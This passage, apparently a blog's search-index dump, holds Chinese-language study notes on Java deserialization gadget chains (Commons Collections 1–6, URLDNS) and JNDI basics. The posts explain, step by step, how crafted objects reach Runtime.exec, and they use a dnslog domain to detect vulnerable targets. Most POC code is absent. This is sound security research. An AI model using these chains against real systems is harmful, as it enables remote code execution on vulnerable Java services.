new一个ChainedTransformer对象，先将fakeTransformers传进去；同样new一个LazyMap对象； 代码3 这里调用add()方法将含有恶意代码的对象传入hashSet，就不用像ysoserial中使用反射去传值，这样比较简便；[6] 跟一下add()方法，这里的map是TiedMapEntry对象，跟进put；[7] 调用了hash方法，继续跟进，k也是TiedMapEntry对象；[8] 跟进hashcode()，这里就调用到了getValue；[9] 跟进，map是LazyMap，调用了get方法；[10] 来到get()，进入if，调用了transform；[11] 跟进，这里的iTransformers是我们传入的fakeTransformers，里面是notepad.exe命令；[12] 命令执行；[13] 可以看一下这时的调用栈；[14] 当然在这里执行命令不算咯，得在反序列化时执行才有用，这里也可以不使用InvokerTransformer，只是为了更清楚的表达这里也会调用LazyMap#get，触发RCE； 继续分析，这里已经调用过一次LazyMap#get了，为了后面反序列化时，能进入get()的if判断，所以调用remove()将key值删除掉；[15] 代码4 通过反射获取ChainedTransformer的iTransformers变量，将含有我们反序列化时要执行的命令的transformers数组传进去，替换前面的fakeTransformers； 完整POC： POC调试从HashMap#readObject开始，调用了put；[16] 调用链和add()差不多，直接跟到InvokerTransformer；[17] 命令执行成功；[18]"},{"title":"Java  Commons Collection 5分析","date":"2022-09-19T11:31:50.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%205%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC5和CC1的相似度很高，分析过CC1就很容易看懂CC5了。 可参考：Java Commons Collection 1分析 环境搭建 JDK 1.8 Commons Collections 3.1 pom.xml中添加： 利用链 ysoserial中提示到这只适用于JDK 8u76，并且没有安全管理器；[1] 前置知识CC5中涉及到两个新的类，这里先介绍一下： TiedMapEntry[2] 该类有两个参数，一个Map类型，一个Object类型；后面我们会使用到它的getValue和toString方法。 BadAttributeValueExpException[3] 该类只有一个val参数。 POC分析 代码1 这一部分和CC1中LazyMap链一样，只要调用了LazyMap.get()，就可以触发ChainedTransformer.transform()，进而对transformers数组进行回调，然后执行命令。 代码2 TiedMapEntry.getValue()调用了get()，参数map是可控的；[4] 所以实例化TiedMapEntry类，将outerMap传进去，第二个参数可以随便填，用来占位； 接着，toString()方法又调用了getValue()方法；[5] 继续找哪里调用了toString()方法；BadAttributeValueExpException.readObject()调用了toString()方法；[6] valObj是从gf中的val参数获取的，而gf又是从反序列化流中读取的；所以，相当于控制了val参数，就控制了valObj，这里就通过反射给val赋为TiedMapEntry类的实例化对象；即调用了TiedMapEntry.toString()，这样就满足了命令执行需要的所以条件。 POC调试从BadAttributeValueExpException,readObject()跟起，valObj就获取到TiedMapEntry类的对象；[7] 跟进toString；[8] 跟进getValue；[9] 跟进get，这里出现了一点问题，map中包含了一个key为123，所以if判断为假，并没有进如if；[10] 按道理是该进入if的，我又尝试了几次；只在这个if这里断点，前面的断点都取消掉，那么map就没有key，可以进入if；[11] 不知道这是什么原因，猜测是跟IDEA的调试机制有关吧； 继续，就跟到了ChainedTransformer.transform()，这里就对tranaforms数组进行循环回调；[12] 循环到第三次InvokerTransformer.transform()；[13] return后，成功执行命令；[14]"},{"title":"Java  Commons Collection 4分析","date":"2022-09-19T11:30:59.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%204%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC4相当于是CC2和CC3的结合，只要熟悉前面几条链了，这条链也就很容易看懂了；CC4和CC2一样是通过调用TransformingComparator.compare()来实现transform()的调用；和CC3一样是通过实例化TrAXFilter类，然后调用它的构造方法，进而实现newTransformer()的调用； 可参考：Java Commons Collection 2分析Java Commons Collection 3分析 环境搭建 JDK 1.7 commons-collections 4.0 javassist pom.xml中添加： 利用链 POC分析 代码1使用javassit创建一个类，这个类中包含static代码块，其中包含恶意命令执行代码，只要实例化这个类，就会执行static中的代码；最后把该类转换为字节码存到targetByteCodes数组中； 代码2实例化一个 TemplatesImpl类对象，给一些参数赋值，赋值原因CC2中说明了原因； 代码3将TrAXFilter.class传给ConstantTransformer，那么就会返回TrAXFilter类，然后传给InstantiateTransformer，在InstantiateTransformer类中就会实例化TrAXFilter类，然而调用它的构造方法，进而调用newTransformer()方法，从而实现命令执行； [1][2] 代码4实例化一个TransformingComparator对象，将transformer传进去；实例化一个PriorityQueue对象，传入不小于1的整数，comparator参数就为null； 代码5新建一个对象数组，第一个元素为templates，第二个元素为1；然后通过反射将该数组传到queue中； 代码6通过反射将queue的size设为2，因为在PriorityQueue.heapify()中，size的值需要大于1才能进入下一步；（CC2中有说到） [3]代码7通过反射给queue的comparator参数赋值，从而调用到compare()方法，实现transform()的调用； POC调试还是从PriorityQueue.readObject()开始；queue[]里面是我们传入的TemplatesImpl类的实例化对象和整数1；[4] 跟进heapify()，size值为2；[5] 跟进siftDown，comparator参数不为null；[6] 跟进siftDownUsingComparator，调用了compare()；[7] 跟进compare()，obj1就是传入的templates，this.transformer是ChainedTransformer的实例化对象，也就是调用了ChainedTransformer.transform()；[8] 跟进ChainedTransformer.transform()，进入循坏；第一轮iTransformer参数值为ConstantTransformer，即调用了ConstantTransformer.transform()；[9] 跟进ConstantTransformer.transform()，iConstant参数值为传入的TrAXFilter.class，即返回了TrAXFilter类[10] 回到ConstantTransformer.transform()进入第二轮循环，这次的iTransformer参数值为InstantiateTransformer，object参数值为TrAXFilter；[11] 跟进InstantiateTransformer.transform()，返回TrAXFilter类对象；[12] 在实例化TrAXFilter类时，调用了它的构造方法，其中调用了templates.newTransformer()；[13] 后面就和CC2一样啦，到这里实例化了javassit新建类；[14] 命令执行成功；[15]"},{"title":"Java  Commons Collection 3分析","date":"2022-09-19T11:30:58.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%203%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC3相当于CC1和CC2的结合，仔细分析过CC1和CC2来看CC3就非常简单。 可参考：Java Commons Collection 1分析Java Commons Collection 2分析 环境搭建 JDK 1.7 Commons Collections 3.1 javassist pom.xml中添加： 利用链 前置知识CC3中会用到两个新的类，这里先介绍一下： TrAXFilter[1] 在该类的构造方法中，调用了传入参数的newTransformer()方法，看到这个方法有点熟悉了，可以实现命令执行，并且参数可控；CC2中，就是在InvokerTransformer.transform()中通过反射调用TemplatesImpl.newTransformer()方法，而CC3中，就可以直接使用TrAXFilter来调用newTransformer()方法。 InstantiateTransformer该类实现了Transformer、Serializable接口；[2] 在它的transform()方法中，判断了input参数是否为Class，若是Class，则通过反射实例化一个对象并返回；[3] POC分析 前面基本是CC2的内容；代码1 使用javassit创建一个类，这个类中包含static代码块，其中包含命令执行代码，只要实例化这个类，就会执行static中的代码；最后把该类转换为字节码存到targetByteCodes数组中； 代码2 实例化一个 TemplatesImpl类对象，给一些参数赋值，赋值原因CC2中说明了原因； 代码3 这里有一些不一样，将TrAXFilter.class传给ConstantTransformer，那么就会返回TrAXFilter类，然后传给InstantiateTransformer，在InstantiateTransformer类中就会实例化TrAXFilter类，然而调用它的构造方法，进而调用newTransformer()方法，从而实现命令执行；然后就是要找到调用ChainedTransformer.transform()的地方，才能对transformers 数组进行回调； 接下来就是CC1的内容了；代码4 new了一个LazyMap的对象，LazyMap的get()方法调用了transform()方法，factory参数就是传入的transformerChain，达到了代码3的条件；[4] 接着就是要找一个调用get()的地方，代码5 还是P牛那句话： 我们如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 AnnotationInvocationHandler是调用处理器，outerMap是被代理的对象，只要调用了LazyMap中的任意方法，就会触发AnnotationInvocationHandler中的invoke方法； 而在readObject方法中调用了entrySet()方法，所以触发invoke；[5] 在invoke方法中就调用了get方法；[6] 这样就基本上达到了执行命令所需要的条件。 调试看看；this.memberValues参数值为LazyMap，调用了它的entrySet方法，触发到invoke方法；[7] 跟进get方法，factory参数为ChainedTransformer的实例化对象，这里调用了它的transform方法；[8] 跟进到ChainedTransformer.transform()，对transformers[]数组进行循环；[9] 第一轮循环，iTransformers[0]参数值为ConstantTransformer，进入它的transform方法，返回TrAXFilter类；[10] 第二轮循坏，iTransformers[1]参数值为InstantiateTransformer，TrAXFilter作为参数传入transform方法；[11] 跟进它的transform方法，input参数值为TrAXFilter，iParamTypes参数值为Templates，iArgs参数值为TemplatesImpl的实例化对象templates，return了TrAXFilter类对象；[12] 在getConstructor(iParamTypes)获取它参数为Templates类的构造方法时，调用了TransformerImpl的newTransformer()；[13] 跟进newTransformer()，调用了getTransletInstance()方法；[14] 跟进，_name参数值为我们传入的blckder02，进入第二个if，_class参数值为null，_bytecodes参数值为用javassit创建的类的字节码；最后实例化_class[_transletIndex]，该参数的值就为EvilCat606069074499600[15] 执行static中的代码；[16] 命令执行成功；[17]"},{"title":"Java  Commons Collection 2分析","date":"2022-09-19T11:30:57.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%202%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"环境搭建CC2使用的是javassist和PriorityQueue来构造利用链；并且使用的是commons-collections-4.0版本，该版本删除了lazyMap的decode方法，所以CC1不用4.0版本；而3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本。 在pom.xml中添加： 利用链 利用链1分析跟着利用链，首先看看PriorityQueue.readObject()[1] 这里的queue[i]是从readObject得到的，再看看writeObject；[2] writeObject中依次将queue[i]进行序列化，那么我们通过反射实例化PriorityQueue类的对象，给queue[i]赋值，就实现了对queue[i]的控制。 最后调用了heapify方法，跟进：[3] 当i&gt;=0时进入for循环，而i=(size &gt;&gt;&gt; 1) -1将size进行了右移操作，所以size&gt;1才能进入循环。 再跟进siftDown方法：[4] x就是queue[i]，跟进siftDownUsingComparator方法：[5] 重点在comparator.compare(x, (E) c)；跟进可以看到Comparator是一个接口，compare是它的抽象方法；[6] CC2利用链中TransformingComparator类实现了compare方法；[7] 该方法中调用了this.transformer.transform()方法，看到这里，就有点熟悉了，this.transformer又是我们可控的，后面的理解和CC1差不多了。 POC1分析 代码1通过反射获取Runtime对象； 代码2当调用ChainedTransformer的transformer方法时，对transformers数组进行回调，从而执行命令；将transformerChain传入TransformingComparator，从而调用transformer方法；new一个PriorityQueue对象，传入一个整数参数，且传入的数值不能小于1，再将Tcomparator传入。 代码3前面说到，size的值要大于1，所以向queue中添加两个元素。 添加上序列化和反序列化代码后，能成功执行命令，但是没有生成序列化文件，也就是没有cc2.txt。 调试代码看一看，跟进PriorityQueue类，这里comparator参数是我们传入的Tcomparator；[8] 继续跟，跟进queue.add(2)，调用了offer方法；[9] 跟进offer方法，进入else分支，调用了siftUp方法；[10] 跟进siftUp方法，comparator参数不为null，进入if分支，调用siftUpUsingComparator方法；[11] 继续跟，来到重点代码；[12] 跟进，这里会执行两次命令；[13] 但是return的值为0，程序就结束了，并没有执行POC后面序列化和反序列化的代码。 那么如何让return不为0呢。既然调用siftUpUsingComparator方法会出错，那试试调用siftUpComparable方法，即comparator参数为null，修改代码，不传入comparator参数。 再调试看看；这下comparator参数就为null；[14] 照样进入queue.add(2)，到siftUp方法，就进入else分支，调用siftUpComparable方法；[15] 这样就只是单纯给queue[1]赋值，并不会调用compare方法；[16] 返回后就执行序列化代码，但是并没有执行命令，还要改进； 代码4上面修改后的代码没有调用到compare方法，我们可以在向queue中添加元素后，通过反射将Tcomparator传入到queue的comparator参数； 这样comparator参数就不为null，当反序列化时调用readObject方法时就会进入siftDownUsingComparator方法，调用compare方法，从而执行命令。[17] 完整POC Javassit补充简述：Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。 下面大概讲一下POC中会用到的类和方法： ClassPoolClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。 常用方法： static ClassPool getDefault()：返回默认的ClassPool，一般通过该方法创建我们的ClassPool； ClassPath insertClassPath(ClassPath cp)：将一个ClassPath对象插入到类搜索路径的起始位置； ClassPath appendClassPath：将一个ClassPath对象加到类搜索路径的末尾位置； CtClass makeClass：根据类名创建新的CtClass对象； CtClass get(java.lang.String classname)：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用； CtClassCtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。 常用方法： void setSuperclass(CtClass clazz)：更改超类，除非此对象表示接口； byte[] toBytecode()：将该类转换为类文件； CtConstructor makeClassInitializer()：制作一个空的类初始化程序（静态构造函数）； 示例代码 新生成的类是这样子的，其中有一块static代码；[17-1] 当该类被实例化的时候，就会执行static里面的语句；[17-2] 利用链2分析在ysoserial的cc2中引入了 TemplatesImpl 类来进行承载攻击payload，需要用到javassit； 先给出POC： 代码1通过反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为newTransformer； 代码2实例化一个TransformingComparator对象，将transformer传进去；实例化一个PriorityQueue对象，传入不小于1的整数，comparator参数就为null； 代码3这里就要用到javassit的知识； 这段代码会新建一个类，并添加了一个static代码块；[17-3] 代码4使用TemplatesImpl的空参构造方法实例化一个对象；再通过反射对个字段进行赋值，为什么要这样赋值下面再说； 代码5新建一个对象数组，第一个元素为templates，第二个元素为1；然后通过反射将该数组传到queue中； 代码6通过反射将queue的size设为2，与POC1中使用两个add的意思一样； 代码6通过反射给queue的comparator参数赋值； 从PriorityQueue.readObject()方法看起，queue变量就是我们传入的templates和1，size也是我们传入的2；[18] 跟进siftDown方法，comparator参数就是我们传入的TransformingComparator实例化的对象；[19] 到TransformingComparator的compare方法，obj1就是我们传入的templates， 这里的this.transformer就是我们传入的transformer；[20] 跟到InvokerTransformer.transform()，input就是前面的obj1，this.iMethodName的值为传入的newTransformer，因为newTransformer方法中调用到了getTransletInstance方法；[21] 接着调用templates的newTransformer方法，而templates是TemplatesImpl类的实例化对象，也就是调用了TemplatesImpl.newTransformer()；跟踪该方法；[22] 继续跟踪getTransletInstance方法；进行if判断，_name不为空，_class为空，才能进入defineTransletClasses方法；这就是代码4中赋值的原因；[23] 跟进defineTransletClasses方法；[24] _bytecodes也不能为null，是我们传入的targetByteCodes，也就是代码3的内容，转换成字节数组是一串这样子的；[25] 继续往下；[26] 通过loader.defineClass将字节数组还原为Class对象，_class[0]就是javassit新建的类EvilCat1153850011981000；[26-1] 再获取它的父类，检测父类是否为ABSTRACT_TRANSLET，所以代码3中要设置AbstractTranslet类为新建类的父类； 给_transletIndex赋值为0后，返回到getTransletInstance方法，创建_class[_transletIndex]的对象，即创建EvilCat1153850011981000类的对象，那么该类中的static代码部分就会执行，成功执行命令；[27] 小结利用链1利用链1相对来说比较简单，只要控制好comparator什么时候为null，什么时候有值，就可以成功生成序列化文件和执行命令； 通过反射获取Runtime对象（得到transformers数组） 利用ChainedTransformer对transformers数组进行回调 调用TransformingComparator.compare触发transformer方法 this.transformer参数可控，传入恶意内容 利用链2利用链2用到了javassit，简单来说就是利用javassit的特点，可以新建一个类，并且可以向该类中插入恶意代码，由static修饰，当别处实例化这个类的时候就会执行static中的恶意代码； 所以整条链都是为了满足能成功实例化新建类而添加的条件；AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance() 参考连接："},{"title":"Java  Commons Collection 1分析","date":"2022-09-19T11:30:56.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%201%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言Java集合框架是JDK1.2中的一个重要补充。它添加了许多功能强大的数据结构，加快了最重要的Java应用程序的开发。从那时起，它已成为Java中公认的集合处理标准。Commons集合试图通过提供新的接口、实现和实用程序来构建JDK类。 Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 ysoerial中CommonsCollection1源码如下： 利用链： 环境搭建创建一个Maven项目，不用选择任何Maven模板；在pom.xml中添加如下代码： 刷新一下，成功导入commons-collections-3.1。[1] JDK1.7 相关类和接口TransformedMapTransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。 ChainedTransformerChainedTransformer是实现了Transformer、Serializable接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起，将前一个回调返回的结果作为后一个的参数传入。 TransformerTransformer是一个接口，只有一个带实现的方法；TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个“回调函数”，这个回调的参数是原始对象。 ConstantTransformerConstantTransformer是实现了Transformer、Serializable接口的一个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回； 作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作。 InvokerTransformerInvokerTransformer是实现了Transformer、Serializable接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键； 在实例化这个InvokerTransformer时，需要传⼊三个参数： 第⼀个参数是待执⾏的⽅法名 第⼆个参数是这个函数的参数列表的参数类型 第三个参数是传给这个函数的参数列表 后面transform方法，通过反射调用执行了input对象的iMethodName方法。 TransformedMap链Test1先构造一个简单的POC： Transformer是一个接口，ConstantTransformer和InvokerTransformer都是Transformer接口的实现类；这里并不是new了一个接口，而是new了一个Transformer类型的数组，里面存储的是 Transformer的实现类对象。 然后使用ChainedTransformer对transformers 数组进行一系列回调； 将创建的innerMap和transformerChain传入TransformedMap.decorate；最后要向Map中放入一个新元素，从而执行命令。[2] Test2上面的Test1并只是一个本地测试，而我们还需要将最终生成的outerMap对象变成一个序列化流；代码1Runtime类没有实现Serializable接⼝，不能被直接序列化；所以我们需要通过反射来获取Runtime对象； 代码2当调用ChainedTransformer的transformer方法时，会对transformers数组进行一系列回调： 将ConstantTransformer返回的Runtime.class传给第一个InvokerTransformer； 将第一个InvokerTransformer返回的(Runtime.class).getMethod(&quot;getRuntime&quot;,null)传给第二个InvokerTransformer； 将第二个InvokerTransformer返回的((Runtime.class).getMethod(&quot;getRuntime&quot;,null)).invoke(null,null)传给第三个InvokerTransformer； (((Runtime.class).getMethod(&quot;getRuntime&quot;,null)).invoke(null,null)).exec(&quot;calc&quot;)是第三个InvokerTransformer的返回值。 代码3用了TransformedMap修饰Map对象，decorate方法中又new了一个TransformedMap对象，transformerChain作为参数传进去； TransformedMap类中的注释说到Map的put方法和Map.Entry的setValue方法会受到该类的影响；[3] TransformedMap继承于AbstractInputCheckedMapDecorator类，而AbstractInputCheckedMapDecorator又继承于AbstractMapDecorator类，AbstractMapDecorator类继承于Map类； 跟到AbstractInputCheckedMapDecorator类的setValue方法；[4]最后其实是调用Map.setValue()； 跟进checkSetValue方法到TransformedMap类，注释中也提到调用setValue方法时自动调用checkSetValue方法；这里调用了valueTransformer的transform方法，而valueTransformer就是我们传入的transformerChain，transformerChain又是ChainedTransformer的实例化对象，也就是成功调用了ChainedTransformer的transformer方法，从而实现代码2对transformers数组进行回调。[5] 代码4通过反射获取AnnotationInvocationHandler类对象，获取构造方法，实例化一个对象handler； 看一下sun.reflect.annotation.AnnotationInvocationHandler类，它的构造函数中第一个参数是个Annotation类，第⼆个是参数就是前⾯构造的Map；[6] 这是一个内部类，需要通过反射来获取；在它的readObject方法中调用了setValue方法，也就是说反序列化时会调用setValue方法，进而实现上面几部分代码。 然而只有当if判断为真时才会进入分支执行setValue方法，也就是说var7不能为null；var7不为null需要满足以下两个条件： 第一个参数必须是Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设方法名为X 被TransformedMap.decorate修饰的Map中必须有⼀个键名为X的元素 而Retention恰好是Annotation类，含有⼀个value方法；[7] 所以这里是创建Retention.class的对象；然后，为了再满⾜第⼆个条件，需要给Map中放⼊⼀个键名为value的元素，所以在代码3中要给Map对象加一个键名为value的元素； 下面大概跟一下为什么键名要和方法名相同；在AnnotationInvocationHandler的readObject方法中，跟进 [8] var0就是我们传入的Retention，再跟进AnnotationType；[9] 第一处返回了Retention类中的所有方法到var2；第二处通过for循坏，获取方法名到var7；第三处将获取到的方法名put到memberTypes。 Retention类中就只有一个value方法，所以memberTypes的值就是value；再回到AnnotationInvocationHandler类，var3的值就是value； 接下来： 所以为了能var3中找到键名为value的值，需要给Map对象put一个键名为value的元素。 最后加上序列化和反序列化的代码，整理为如下POC： [10] 这个POC只有在Java 8u71以前的版本中才能执行成功，Java 8u71以后的版本由于sun.reflect.annotation.AnnotationInvocationHandler发⽣了变化导致不再可⽤；在ysoserial的代码中，没有⽤到上面POC的TransformedMap，而是改用了了LazyMap。 LazyMap链LazyMap也来自于Common-Collections库，并继承AbstractMapDecorator类。LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的factory.transform 。当在get找不到值的时候，它会调用factory.transform方法去获取一个值：[11] 代码1和代码2与TransformedMap链中的一样； 代码3 因为要满足map.containsKey(key) == false，就不需要向Map中添加元素；把transformerChain传进去，transformerChain是Transformer类型的；看一下LazyMap.decorate方法：[12] new了一个LazyMap对象；[13] get方法中的factory就是我们传入的transformerChain，也就是说，只要调用了get方法，并且Map对象中的没有key，就可以触发ChainedTransformer的transform方法，从而实现代码2对transformers数组进行回调，进而执行命令。 现在要找一个调用get方法的地方；在AnnotationInvocationHandler类的invoke方法中调用了get方法：[14] 那又要如何调用到invoke方法；P牛的文章中说到： 我们如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 Java动态代理知识可参考：Java 动态代理 代码4通过反射获取sun.reflect.annotation.AnnotationInvocationHandler对象，再对该对象进行Proxy； Proxy.newProxyInstance的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。 代理后的对象叫做proxyMap，但不能直接对其进行序列化，因为入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹： 最后添加上序列化和反序列化的代码整理为如下POC： 成功执行命令：[15] 参考连接：Java安全漫谈 - 09.反序列化篇(3)Java安全漫谈 - 10.反序列化篇(4)Java安全漫谈 - 11.反序列化篇(5) 疑问[16] 最后LazyMapd POC直接执行没有计数器弹出，经调试发现，计算器在上图第一处就弹出，有时不止弹出一次；问题解决，以上两个POC都可在1.7版本下执行命令。 程序运行到上图第二处时就结束，未执行后续代码。"},{"title":"Java URLDNS链分析","date":"2022-09-19T11:30:55.000Z","url":"/2022/09/19/Java%20URLDNS%E9%93%BE%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言ysoserialysoserial是学习反序列化漏洞的一个重要工具，它集合了多种反序列化漏洞的payload，可以让用户根据自己选择的利用链，生成反序列化利用数据，通过讲这些数据发送给目标，从而执行用户预先定义的命令。下载地址：ysoserial 什么是利用链利用链也叫“gadget chains”，通常称为gadget。可以类比PHP反序列化，将gadget理解为一种方法，它连接的是从触发位置开始到执行命令位置结束，类似PHP中从__destruct到eval。 使用ysoserial可以容易的生成gadget对应的POC，例如： ysoserial⼤部分的gadget的参数就是⼀条命令，⽐如这⾥是id；⽣成好的POC发送给⽬标，如果⽬标存在反序列化漏洞，并满⾜这个gadget对应的条件，则命令id将被执⾏。 URLDNSURLDNS是ysoserial中一个利用链的名字，但准确来说，不能称作利用链。因为其参数不是一个可以“利用”的命令，而仅为一个URL，其能触发的结果也不是命令执行，而是一个DNS请求。 URLDNS有如下优点，适合在检测反序列化漏洞是使用： 使用Java内置的类构造，不依赖第三方库 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 不限JDK版本 将下载的ysoserial用Intellij IDEA打开，进入ysoserial/src/main/java/ysoserial/payloads/URLDNS.java即可看到ysoserial中URLDNS的源码： 注释中给出了利用链： 利用链分析HashMap.java#readObject触发反序列化的方法一般就是readObject() 最后一行代码将key使用hash函数进行了处理； 跟进hash()函数； 这里的key是java.net.URL对象，值是传入的url，不为null，进入hashCode方法；URL.java#hashCode hashCode值等于-1时会进行handler.hashCode(this)计算；这里hanlder是URLStreamHandler对象（的某个⼦类对象），继续跟进hashCode方法；URLStreamHandler.java#hashCode 跟进getProtocol方法，是用来获取传入URL的协议名称； 再看getHostAddress方法；URLStreamHandler.java#getHostAddress InetAddress.getByName(host)是根据主机名获取其IP地址，这时候就会触发一次DNS请求。 漏洞测试在上获取一个子域名z57gpb.dnslog.cn作为url传入；[1]反序列化类： 测试类： URL类中hashCode成员变量是私有的，要加setAccessible(true)才能访问；[2] 先运行测试类，生成demo.txt文件，在运行反序列化类，成功触发DNS请求；[3] 小结利用链可归结为： HashMap-&gt;readObject() HashMap-&gt;hash() URL-&gt;hashCode() URLStreamHandler-&gt;hashCode() URLStreamHandler-&gt;getHostAddress() InetAddress-&gt;getByName() java.util.HashMap 重写了readObject方法，在反序列化时会调用hash函数计算key的 hashCode，而java.net.URL的hashCode在计算时会调用getHostAddress来解析域名，从而发出DNS请求. 参考连接：安全漫谈 - 08.反序列化篇(2) 疑问： 测试代码是如何跟URLDNS联系的，如何发送DNS请求 DNS请求是在序列化时触发还是反序列化时触发，怎么触发的（经测试是在反序列化时触发的） "},{"title":"Java JNDI","date":"2022-09-19T11:29:30.000Z","url":"/2022/09/19/Java%20JNDI/","categories":[[" ",""]],"content":"概述JNDI全称是Java命名和目录接口（Java Naming and Directory Interface），是Java中为命名和目录服务提供接口的API。 JNDI由Naming(命名)和Directory(目录)组成： 命名NamingNaming是指将对象通过唯一标识符(取个名字)绑定到一个容器环境Context中，以后又可以使用lookup方法从环境容器中根据这个唯一标识符找到所绑定的Java对象。 在真实的项目应用中，通常是由系统程序或框架程序先将资源对象绑定到JNDI环境中，以后在该系统或框架中运行的模块程序就可以从JNDI环境中查找这些资源对象进行使用，而不用关心数据源(DataSource)对象是如何创建出来的，这种方式极大的增强了系统的可维护性。 容器环境(Context) 本身也是一个Java对象，他可以通过一个名称绑定到另一个容器环境中。将一个Context对象绑定到另一个Context对象中，这就形成了一种父子级联关系，多个Context对象最终可以级联成一种树状结构，树中的每个Context对象中都可以绑定若干个Java对象。 [1] 上图中，每个方框都代表一个Context对象，名称分别为a、b、c、d，其中存在父子级关系；椭圆1、2、3、4、5、6、7则是绑定在容器环境中的Java对象，在同一个Context不能绑定两个相同名称的Java对象，在不同的Context中可以出现同名的Java对象。 调用Context对象的lookup方法可以获取其中绑定的Java对象，也可以获取其所在Context树状结构中的任意一个Context对象，包括它的父级和子级，只需要在lookup方法中指定相应的Context路径即可。 要执行JNDI命名操作，必须获取一个作为操作入口的Context对象，在JNDI API中，提供了InitialContext类来创建Context对象。InitialContext类实现了Context接口，上面所说的Context对象其实是Context接口的某个实现类中的实例对象。 目录DirectoryJNDI中的目录与文件目录不同，JNDI中的目录是指将一个对象的所有属性信息保存到一个容器环境中，与JNDI的命名原理相似，只不过目录容器环境中保存的是对象的属性，而不是对象本身，所以JNDI的目录提供的是对属性的各种操作。 JNDI API中提供了DirContext接口来完成目录相关操作，该接口继承了Context接口，名称(Name)可以作为参数传给DirContext，所以它也能完成命名的相关操作。 [2] 上图中，每个方框都代表一个DirContext对象，名称分别为a、b，b是a的子DirContext椭圆dog、cat则是绑定在目录容器环境中的Java对象；圆角矩形代表某个对象的属性。一个DirContext容器环境中既可以绑定java对象本身，也可以绑定对象的属性，尽管它们的名字相同，但是对它们的操作是独立的；并且一个属性可以拥有多个属性值。 同样，要执行JNDI命名与目录属性操作，必须获取一个作为操作入口的DirContext对象，JNDI API中提供了一个InitialDirContext类来创建DirContext对象。 下面再具体介绍相关类的使用。 JNDI 相关APIJava JDK中提供了java.naming模块，其中包含5个包： javax.naming：提供用于访问命名服务的类和接口 javax.naming.directory：扩展 javax.naming程序包以提供访问目录服务的功能 javax.naming.event：在访问命名和目录服务时为事件通知提供支持 javax.naming.ldap：提供对LDAPv3扩展操作和控件的支持 javax.naming.spi：提供通过 javax.naming和相关软件包动态插入支持访问命名和目录服务的 javax.naming Class InitialContext实现了Context接口，已知直接子类有InitialDirContext；构造方法： InitialContext()：构造一个初始上下文 InitialContext(boolean lazy)：构造一个初始上下文，可以选择不初始化它 InitialContext(Hashtable&lt;?, ?&gt; environment)：使用提供的环境构造初始上下文。 常用方法： bind(Name name, Object obj)：将名称绑定到对象 list(String name)：枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名 lookup(String name)：检索命名对象 rebind(String name, Object obj)：将名称绑定到对象，覆盖任何现有绑定 unbind(String name)：取消绑定命名对象 示例代码： Class Reference实现了Serializable 、Cloneable接口，已知直接子类有LinkRef；此类表示对在命名&#x2F;目录系统外部找到的对象的引用；Reference提供了一种记录有关对象的地址信息的方法，这些对象本身并不直接绑定到命名&#x2F;目录系统。 构造方法： Reference(String className)：为类名为“className”的对象构造一个新引用 Reference(String className, String factory, String factoryLocation)：构造具有类名“className”的对象的新引用，以及对象工厂的类名和位置 Reference(String className, RefAddr addr)：为类名为“className”的对象和地址构造一个新引用 Reference(String className, RefAddr addr, String factory, String factoryLocation)：构造具有类名“className”的对象的新引用，对象工厂的类名和位置以及对象的地址 常用方法： void add(int posn, RefAddr addr)：将地址添加到索引posn的地址列表中 void add(RefAddr addr)：将地址添加到地址列表的末尾 void clear()：从此引用中删除所有地址 RefAddr get(int posn)：检索索引posn上的地址 RefAddr get(String addrType)：检索地址类型为“addrType”的第一个地址 Enumeration&lt;RefAddr&gt; getAll()：检索本参考文献中地址的列举 String getClassName()：检索引用引用的对象的类名 String getFactoryClassLocation()：检索此引用引用的对象的工厂位置 String 